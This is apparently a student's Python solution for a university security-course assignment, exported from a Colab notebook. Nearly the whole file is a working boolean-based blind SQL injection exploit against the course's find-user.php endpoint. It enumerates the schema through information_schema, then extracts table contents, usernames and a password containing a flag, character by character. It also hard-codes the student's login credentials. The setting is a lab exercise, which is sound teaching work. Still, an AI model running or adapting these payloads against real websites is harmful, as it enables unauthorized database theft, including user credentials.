# -*- coding: utf-8 -*-
"""WS A2.ipynb
author: Lihua Wang
SID: 1164051

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1HE940PQA-QffJIV6WWdxsaHP3t5sl-kL
"""

import requests
from urllib.parse import quote
import time

session = requests.session()

"""
Login
"""
url = "http://assignment-hermes.unimelb.life/auth.php"
credential = {"user":"lihuwang", "pass":"lihuwang"}
session.post(url, data = credential)


"""
SQL Blind Injection
"""

# chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#()*+,-./:;<=>?@{}~[\]$%&'^_`"
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,"

# find database
# Suppose the database name not longer than 10 characters
database = []
for i in range(1, 10):
    # in each character position, apply all the possible value of characters
    for char in chars:
        # To keep the numbers of sending requests no more than 30 times per minute
        time.sleep(2)
        payload = f"' union select 1, 2, 3 where binary substring(database(), {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            database.append(char)
            break
print("database name: ", "".join(database))

#find table names
tables = []
for i in range(1, 30):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(table_name) as t \
        from information_schema.tables where TABLE_SCHEMA='Secure') as tabel where binary substring(t, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            tables.append(char)
            break
print("table name: ", "".join(tables))

# find column names of a table
# Trainings columns
train_columns = []
for i in range(1, 25):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(column_name) as col from information_schema.columns where table_name='Trainings' \
        and TABLE_SCHEMA='Secure') as t where binary substring(col, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            train_columns.append(char)
            break
print("Trainings columns: ", "".join(train_columns))

# Users columns
users_columns = []
for i in range(1, 50):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(column_name) as col from information_schema.columns where table_name='Users' \
        and TABLE_SCHEMA='Secure') as t where binary substring(col, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            users_columns.append(char)
            break
print("Users columns: ", "".join(users_columns))

#  testing columns
test_columns = []
for i in range(1, 10):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(column_name) as col from information_schema.columns where table_name='testing' \
        and TABLE_SCHEMA='Secure') as t where binary substring(col, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            test_columns.append(char)
            break
print("testing columns: ", "".join(test_columns))

chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#()*+,-./:;<=>?@{}~[\]$%&'^_`"

# Get Trainings column Name
trainings_Name = []
for i in range(1000):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(Name) as na from Secure.Trainings) as t \
        where binary substring(na, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            trainings_Name.append(char)
            break
print("Trainings column Name: ", "".join(trainings_Name))

# Get Trainings column Description "COMP90074-1337"
train_Description = []
for i in range(100):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(Description) as des from Secure.Trainings where Secure.Trainings.Name = 'COMP90074-1337') \
        as t where binary substring(des, {i}, 1) = '{char}'; #"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            train_Description.append(char)
            break
print("Trainings column Name: ", "".join(train_Description))

# Discover testing column msg content
testing_msg = []
for i in range(1, 5):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(msg) as message from Secure.testing) as t where binary substring(message, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            testing_msg.append(char)
            break
print("testing column msg: ", "".join(testing_msg))
# the results show that the testing msg are null.

# Discover testing column id content
testing_id = []
for i in range(1, 5):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(id) as identity from Secure.testing) as t where binary substring(identity, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            testing_id.append(char)
            break
print("testing column id: ", "".join(testing_id))
# seems the results of testing column id are null

# Discover Users column Name
users_Name = []
for i in range(1, 2000):
    for char in chars:
        # time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(Username) as na from Secure.Users) as t where binary substring(na, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username="+  quote(payload))
        if respond.text == 'true':
            users_Name.append(char)
            print("".join(users_Name))
            break
print("Users column Name: ", "".join(users_Name))

# Discover Users column Password
users_Password = []
for i in range(1, 40):
    for char in chars:
        time.sleep(2)
        payload = f"'union select 1,1,1 from (select GROUP_CONCAT(Password) as pwd from Secure.Users where Password like '%FLAG%') \
        as t where binary substring(pwd, {i}, 1) = '{char}';#"
        respond = session.get("http://assignment-hermes.unimelb.life/find-user.php?username=" + quote(payload))
        if respond.text == 'true':
            users_Password.append(char)
            break
print("Users column Password: ", "".join(users_Password))